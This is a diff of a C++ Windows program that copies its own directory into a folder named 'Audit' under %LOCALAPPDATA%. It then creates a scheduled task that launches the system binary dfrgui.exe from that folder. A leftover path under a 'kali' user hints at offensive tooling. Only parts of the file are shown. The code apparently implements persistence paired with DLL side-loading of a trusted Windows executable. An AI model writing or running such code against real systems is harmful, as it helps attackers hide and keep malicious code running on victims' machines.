@@ -1,12 +1,42 @@
-#include <windows.h>
 #include <taskschd.h>
 #include <comutil.h>
+#include <filesystem>
 #include <iostream>
+#include <Windows.h>
+#include <shlobj_core.h>
+#include <KnownFolders.h>
+
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsupp.lib")
 
 int main()
 {
+    // Define the source directory
+    std::filesystem::path sourceDirectory = std::filesystem::current_path();
+
+    // Get the %LOCALAPPDATA% path
+    PWSTR path = NULL;
+    HRESULT hres = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path);
+    if (!SUCCEEDED(hres)) {
+        std::cout << "Failed to get %LOCALAPPDATA% path.\n";
+        return 1;
+    }
+    std::filesystem::path localAppDataPath = path;
+    CoTaskMemFree(path);
+
+    // Create a new directory in %LOCALAPPDATA%
+    std::filesystem::path targetDirectory = localAppDataPath / "Audit";
+    bool exist = std::filesystem::exists(targetDirectory);
+    if (!exist) {
+        std::filesystem::create_directory(targetDirectory);
+        std::cout << "Created Directory" << std::endl;
+    }
+    std::cout << "Start to copy" << std::endl;
+
+    // Copy the directory files recursively
+    std::filesystem::copy(sourceDirectory, targetDirectory, std::filesystem::copy_options::recursive | std::filesystem::copy_options::overwrite_existing);
+    std::wcout << "Directory copied successfully to " << targetDirectory << ".\n";
+
     // Initialize COM
     CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
@@ -58,7 +88,8 @@ int main()
     pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
 
     // Set the path of the executable for the action
-    pExecAction->put_WorkingDirectory(_bstr_t(L"C:\\Users\\kali\\Desktop\\dfrgui"));
+    // pExecAction->put_WorkingDirectory(_bstr_t(L"C:\\Users\\kali\\Desktop\\dfrgui"));
+    pExecAction->put_WorkingDirectory(SysAllocString(targetDirectory.c_str()));
     pExecAction->put_Path(_bstr_t(L"dfrgui.exe"));
 
     // Save the task
